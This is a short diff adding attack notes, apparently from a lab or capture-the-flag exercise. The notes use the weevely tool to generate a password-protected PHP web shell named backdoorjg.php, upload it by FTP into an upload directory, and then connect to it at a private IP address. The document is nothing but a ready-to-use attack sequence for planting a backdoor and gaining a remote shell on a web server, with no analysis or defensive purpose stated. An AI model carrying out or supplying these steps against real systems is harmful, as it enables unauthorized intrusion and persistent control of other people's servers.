@@ -1,0 +1,8 @@
+
+
+
+weevely generate 1234 backdoorjg.php    
+
+ftp / cd upload / put backdoorjg.php 
+
+weevely http://10.0.5.25/upload/backdoorjg.php 1234
